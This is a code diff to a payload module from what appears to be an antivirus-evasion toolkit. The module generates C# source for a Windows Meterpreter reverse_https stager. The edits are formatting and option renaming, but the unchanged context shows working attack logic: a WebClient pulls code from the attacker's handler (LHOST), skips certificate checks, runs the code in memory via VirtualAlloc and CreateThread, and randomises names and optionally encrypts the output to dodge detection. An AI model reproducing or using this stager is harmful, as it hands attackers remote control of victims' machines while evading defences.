@@ -12,7 +12,7 @@ from modules.common import encryption
 import random
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
@@ -21,12 +21,14 @@ class Payload:
         self.rating = "Excellent"
 
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"LHOST"            : ["", "IP of the metasploit handler"],
-                                 "LPORT"            : ["8081", "Port of the metasploit handler"],
-                                 "compile_to_exe"   : ["Y", "Compile to an executable"],
-                                 "use_arya"         : ["N", "Use the Arya crypter"]}
-        
-        
+        self.required_options = {
+                                    "LHOST"            : ["", "IP of the Metasploit handler"],
+                                    "LPORT"            : ["8081", "Port of the Metasploit handler"],
+                                    "COMPILE_TO_EXE"   : ["Y", "Compile to an executable"],
+                                    "USE_ARYA"         : ["N", "Use the Arya crypter"]
+                                }
+
+
     def generate(self):
 
         # imports and namespace setup
@@ -83,7 +85,7 @@ class Payload:
         sName = helpers.randomString()
 
         payloadCode += "static byte[] %s(string %s) {\n" %(getDataName,strName)
-        payloadCode += "ServicePointManager.ServerCertificateValidationCallback = %s;\n" %(validateServerCertficateName) 
+        payloadCode += "ServicePointManager.ServerCertificateValidationCallback = %s;\n" %(validateServerCertficateName)
         payloadCode += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
         payloadCode += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
         payloadCode += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
@@ -128,7 +130,7 @@ class Payload:
         r = [helpers.randomString() for x in xrange(12)]
         payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
 
-        if self.required_options["use_arya"][0].lower() == "y":
+        if self.required_options["USE_ARYA"][0].lower() == "y":
             payloadCode = encryption.arya(payloadCode)
 
         return payloadCode
